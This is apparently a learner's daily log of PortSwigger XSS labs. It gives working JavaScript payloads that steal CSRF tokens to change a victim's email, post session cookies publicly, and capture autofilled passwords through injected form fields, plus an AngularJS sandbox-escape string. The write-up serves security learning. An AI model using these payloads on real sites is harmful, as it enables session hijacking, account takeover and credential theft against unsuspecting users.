# Day 30: CSRF via XSS, Stealing Cookies, and First Expert Lab

- Lab: Exploiting XSS to bypass CSRF defenses, solved
- Lab: Exploiting XSS to steal cookies, solved (via the CSRF-based alternative,
  not Collaborator)
- Lab: Exploiting XSS to capture passwords, blocked (autofill-dependent
  alternative attempted across several variations, not reliable in the test
  environment; requires Burp Suite Professional for the intended solution)
- Lab: Reflected XSS with AngularJS sandbox escape without strings, solved
  (first Expert-tier lab)

Roadmap: 2C XSS, exploitation group mostly done, one lab genuinely blocked.
First Expert lab complete.

## What I learned

### Exploiting XSS to bypass CSRF defenses

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get', '/my-account', true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf=' + token + '&email=test@test.com');
}
</script>
```

Posted as a stored blog comment. How it works, step by step:
- `new XMLHttpRequest()` creates a request object that can fetch pages and
  send data from JavaScript
- The first request visits `/my-account`, the victim's own account page,
  using the victim's own session, since this script runs inside their
  browser when they view the comment
- `this.responseText.match(/name="csrf" value="(\w+)"/)[1]` searches the
  returned HTML text for the CSRF token's exact pattern and extracts just
  the token value
- A second request then POSTs to `/my-account/change-email` with that stolen,
  valid token plus a new email address, the server can't tell this apart
  from the real user changing their own email, since the token is genuine

### Exploiting XSS to steal cookies (CSRF alternative, not Collaborator)

Since Collaborator requires Burp Professional, used the same CSRF-stealing
pattern but stole `document.cookie` instead of an email-change token, and
posted the result as a public comment instead of to an external server:

```javascript
<script>
var req = new XMLHttpRequest();
req.onload = handleresponse;
req.open('get', '/post?postId=3', true);
req.send();
function handleresponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var chgreq = new XMLHttpRequest();
    chgreq.open('post', '/post/comment', true);
    chgreq.send('csrf=' + token + '&postId=3&comment=' + document.cookie + '&name=x&email=x@x.com&website=');
}
</script>
```

Same two-step shape as the CSRF lab: steal a fresh CSRF token from the blog
post page, then submit a new comment using that token, except this time the
"comment" is the victim's own session cookie, leaked publicly where it can be
read and reused to hijack their session. Confirmed by replacing the session
cookie value in a request and loading the account page as the victim.

### Exploiting XSS to capture passwords, attempted and blocked

Tried the autofill-based alternative mentioned in PortSwigger's own solution
text: inject fake `username` and `password` input fields (matching the real
form's field names) with an `onchange` handler that posts both values as a
comment the moment the password field's value changes. The idea: if the
victim's browser has saved credentials, autofill would fill these fields
automatically and trigger the handler without any typing.

```html
<form>
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('/post/comment',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'csrf='+document.querySelector('[name=csrf]').value+'&postId=3&comment='+username.value+':'+this.value+'&name=x&email=x@x.com&website='})">
</form>
```

Confirmed the fields rendered correctly as real, usable inputs on the page.
Tried multiple postIds and both a bare and form-wrapped version, waited
several minutes each time, no autofill ever triggered. Marked blocked:
requires Burp Professional for the intended Collaborator solution, and the
autofill alternative is not reliable in PortSwigger's test environment,
since it depends on browser autofill cooperation that cannot be guaranteed
or forced the way document.cookie access can.

### Reflected XSS with AngularJS sandbox escape without strings (Expert)

```
1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

This lab disabled `$eval` and blocked any literal quote marks, both usual
AngularJS sandbox escape routes. Explained step by step:

- `toString()` called on a value produces a string without ever typing a
  quote mark, the loophole this whole payload is built around
- `.constructor` on that string reaches the `String` function itself, the
  blueprint every string is built from
- `.prototype.charAt = [].join` overwrites the `charAt` function, which
  AngularJS's internal sandbox checks rely on behind the scenes, silently
  breaking those checks and letting otherwise-blocked code through
- `[1]|orderBy:...` is ordinary AngularJS syntax for sorting a list,
  harmless by itself
- `toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)`
  builds the real payload text purely from character codes (120='x', 61='=',
  97='a', and so on), spelling out `x=alert(1)` without typing a single
  quote mark anywhere

## Key takeaways
- The same steal-a-token-then-act pattern (visit a page, extract something
  from its HTML with a regex, then use it in a second request) works for
  CSRF tokens, session cookies, or any other value sitting in a page's HTML,
  not just one specific use case
- A CSRF-token theft and a cookie theft are nearly identical exploits, only
  what gets extracted and where it gets sent differs
- Not every "non-Collaborator alternative" PortSwigger mentions is reliable,
  some genuinely depend on environment behavior (like browser autofill) that
  can't be forced or guaranteed, and that's worth recognizing and moving on
  from rather than assuming a personal mistake
- Expert-tier AngularJS sandbox escapes build strings from numbers
  (fromCharCode) instead of quotes when quotes are banned, and can disable
  the sandbox's own safety checks by overwriting a function it relies on
  internally
